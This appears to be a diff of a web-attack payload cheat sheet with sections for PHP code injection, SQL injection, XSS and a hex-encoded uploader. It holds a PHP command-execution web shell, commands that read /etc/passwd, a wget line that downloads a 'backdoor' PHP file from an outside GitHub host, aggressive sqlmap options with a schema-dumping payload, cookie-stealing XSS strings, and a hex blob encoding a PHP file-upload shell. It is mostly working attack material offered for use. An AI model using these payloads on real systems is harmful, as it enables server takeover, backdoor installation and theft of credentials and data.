@@ -1,20 +1,30 @@
-~PHP CODE INJECTION~ { system() passthru() exec() shell_exec() fopen() file_get_contents() readfile() fsockopen() }
+~PHP CODE INJECTION~ system() passthru() exec() shell_exec() fopen() file_get_contents() readfile() fsockopen()
 
 ${@print('test')}
 ${@system('ls -la')}
-<?php system('tail /etc/passwd'); ?>
-<?php system('cat /etc/passwd'); ?>
 <?php echo "<pre>"; system($_GET[cmd]); ?>
+For read phpinfo : <?php phpinfo(); ?>
+For read passwd file : <?php system('tail /etc/passwd'); ?>
+For read all file in this directory : <?php system('dir'); ?>
+For spawn ur shell : <?php system('wget https://raw.githubusercontent.com/Sultan1337/backdoor/main/hidden.php'); ?>
 
-~SQL injection~
-
+~SQL INJECTION~
 (select*from(select(sleep(5)))a)
 '='OR'
 '='or'
 '='OR'@gmail.com
 test@gmail.com' OR 1=1 --
 ' or 1=1 limit 1 -- -+
-
+--random-agent --threads=5 --risk=3 --level=5 --invalid-string --invalid-logical --invalid-bignum --tamper=between,informationschemacomment,charencode,bluecoat --force-ssl -v2 --parse-errors --current-db --dbs
+concat(0x496e6a65637465642042792053756c74616e20,'<br>','<br>',0x55736572203a20,user(),'<br>',0x56657273696f6e203a20,version(),'<br>',0x4461746162617365203a20,database(),'<br>',(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x))
 
 ~XSS~
 <img src=xss onerror=alert(1)>
+“><img src=x onerror=prompt(document.domain)>
+"><script>alert(document.location="https://Instagram.com/smith.id_")</script>
+"><script>alert(document.cookie)</script>
+"onmouseover="alert('xxs')"
+<svg onload=alert%26%230000000040"1")>
+
+~UPLOADER HEXA~
+0x3c3f706870206563686f202755706c6f616465723c62723e27203b6563686f2020273c62723e27203b6563686f20273c666f726d20616374696f6e3d222022206d6574686f643d22706f73742220656e63747970653d226d756c7469706172742f666f726d2d6461746122206e616d653d2275706c6f61646572222069643d2275706c6f61646572223e27203b6563686f20273c696e70757420747970653d2266696c6522206e616d653d2266696c65222073697a653d223530223e3c696e707574206e616d653d225f75706c2220747970653d227375626d6974222069643d225f75706c222076616c75653d2275706c6f6164223e3c2f666f726d3e27203b696628245f504f53545b275f75706c275d20203d3d202275706c6f6164222029207b69662840636f707928245f46494c45535b2766696c65275d5b27746d705f6e616d65275d2c20245f46494c45535b2766696c65275d5b276e616d65275d2929207b206563686f20273c623e75706c6f6164202121213c2f623e3c62723e3c62723e27203b20207d656c7365207b206563686f20273c623e55706c6f616420212121203c2f623e3c62723e3c62723e27203b20207d7d3f3e
